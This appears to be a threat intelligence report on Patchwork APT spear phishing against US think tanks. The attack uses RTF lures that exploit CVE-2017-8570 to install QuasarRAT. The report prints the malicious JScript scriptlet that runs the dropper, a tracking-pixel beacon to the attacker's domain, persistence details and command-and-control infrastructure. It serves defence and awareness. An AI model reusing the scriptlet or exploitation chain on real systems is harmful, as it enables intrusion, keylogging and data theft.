In March and April 2018, Volexity identified multiple spear phishing campaigns attributed to
Patchwork, an Indian APT group also known as Dropping Elephant. This increase in threat
activity was consistent with other observations documented over the last few months in blogs
by 360 Threat Intelligence Center analyzing attacks on Chinese organizations and Trend
Micro noting targets in South Asia. From the attacks observed by Volexity, what is most
notable is that Patchwork has pivoted its targeting and has launched attacks directly against
US-based think tanks. Volexity has also found that, in addition to sending malware lures, the
Patchwork threat actors are leveraging unique tracking links in their e-mails for the purpose of
identifying which recipients opened their e-mail messages.
In three observed spear phishing campaigns, the threat actors leveraged domains and themes
mimicking those of well-known think tank organizations in the United States. The group lifted
articles and themes from the Council on Foreign Relations (CFR), the Center for Strategic and
International Studies (CSIS), and the Mercator Institute for China Studies (MERICS) for use in
their spear phishing lures and malicious Rich Text Format (RTF) documents. Strangely, in one
case, the threat actors also appear to have used a domain name similar to the Foreign Policy
Research Institute (FPRI) in a message purporting to be from CFR. Each of the spear
phishing attacks contained links to .doc files, which were really RTF documents that attempt to
exploit CVE-2017-8570 (Composite Moniker). The threat actors appear to have leveraged
publicly available exploit code that can be found on Github at the URL:
https://github.com/rxwx/CVE-2017-8570. If the exploit is successful, the threat actors will
attempt to drop and execute QuasarRAT. Details of the malware and the associated attacks
are listed below.

Spear Phishing Messages
2/12

Each e-mail was sent from the attacker-controlled domain mailcenter.support. This domain
was not only used to send the phishing e-mails, but also to track which targets opened the email. Within each of the HTML-formatted messages, an embedded image tag is used to
beacon home to the attacker's domain, containing an unique identifier specific to the recipient.
<img src=3D"hxxps://www.mailcenter.support/track/<unique_32_byte_identifier>"
width=3D"0" height=3D"0" />
While the use of e-mail recipient tracking, a linked RTF document, and a final payload
(QuasarRAT variant) remained the same, certain elements differed across campaigns
observed. Details on each of the messages are listed below.

Sample Message

The image below shows an example of how the spear phishing message would look to a
recipient.

4/12

Exploitation and Malware Execution
Upon opening the above attachments, the recipient will be presented with a document that is a
direct copy of a blog post or report released by the think tank organization being
impersonated. At first glance, everything might look legitimate, but in the background the
target user has likely just been infected with QuasarRAT. QuasarRAT is a freely available
"remote (administration|access) tool" (RAT) written in C# and distributed via Github. This RAT
provides a variety of functionality that makes it particularly attractive to an attacker. This
includes, but is not limited to, the following:
AES encryption of network communication
File management
Functionality to download, upload, and execute files
Keylogging
Remote desktop access

5/12

Remote webcam viewing
Reverse proxy
Browser and FTP client password recovery
The images below are what a target user opening a malicious RTF document would see from
within Microsoft Word.

When the malicious RTF document is opened,
two things happen that allow the attacker malware to run. First, the "packager trick" is
leveraged in order to embed the initial QuasarRAT dropper (qrat.exe) in the malicious RTF
document. Its called the "packager trick" because any file embedded in an RTF file using
packager will be automatically dropped to the %tmp% folder
(c:\Users\%username%\AppData\Local\Temp) when the RTF document is opened. Second,
the threat actors exploit CVE-2017-8570 to achieve code execution via a malicious "scriptlet"
file, or .sct file, which is also embedded in the malicious RTF document. The contents of the
malicious scriptlet file (displayed below) clearly show the threat actor executing the initial
"qrat.exe" dropper from the current user's %tmp% directory.

Note: The scriptlet code is an exact match to that shown on the Github page referenced earlier
for CVE-2017-8570. The string "fjzmpcjvqp" is unique and not something likely to be present if
the code was not generated with the same public POC exploit code.

6/12

<?XML version="1.0"?>
<scriptlet>
<registration description="fjzmpcjvqp"
progid="fjzmpcjvqp"
version="1.00"
classid="{204774CF-D251-4F02-855B-2BE70585184B}"

<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd /c
%tmp%\\qrat.exe",0,false);
exit();
]]>
</script>
</scriptlet>
After the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a
directory in C:\Users\%username%\AppData\Roaming\Microsoft
Network\microsoft_network\1.0.0.0 and unpacks/drops the final QuasarRAT binary named
microsoft_network.exe.

The malware also contains an embedded .NET wrapper DLL for creating and managing
scheduled tasks on Windows systems. The file, named Microsoft.Win32.TaskScheduler.dll, is
digitally signed by a certificate from AirVPN.

7/12

This DLL is used to create a scheduled task that points to the QuasarRAT binary,
microsoft_network.exe, allowing it to remain persistent after reboot.

As seen in the image above, the QuasarRAT scheduled task is named
Microsoft_Security_Task and runs at 12:00 AM each day. Once the task is triggered, it will
then repeat every 5 minutes for 60 days. When executed, microsoft_network.exe will initiate
a request to freegeoip.net in order to determine the geographical location of the infected host.
Immediately following the request, the malware will begin to beacon over an encrypted
connection to the threat actor's command and control domain tautiaos.com (43.249.37.199).
Several related samples were identified and are included in the File Indicators section below.

Conclusion
The addition of US-based think tanks to the list of organizations in the crosshairs of Patchwork
shows an increasing diversity in the geographic regions being targeted. While there were a
few peculiar components to some of the spear phish messages, the campaigns and themes
8/12

were strategically relevant to the organizations being targeted. The Patchwork threat actors
also appear to have adopted a technique seen from other APT groups where they are now
tracking the effectiveness of their campaigns by recording which recipients have opened the
phishing message. This information allows a threat actor to determine if their messages were
delivered, which users are more susceptible to opening them, and basic information regarding
the target's operating system and e-mail client (or browser). Finally, although the payload
observed being delivered by Patchwork in these campaigns is a readily available open source
RAT, it does allow for flexibility in interacting with compromised machines without needing to
use custom malware. Volexity is actively tracking this group and the infrastructure currently in
use for the benefit of its network security monitoring and threat intelligence customers.
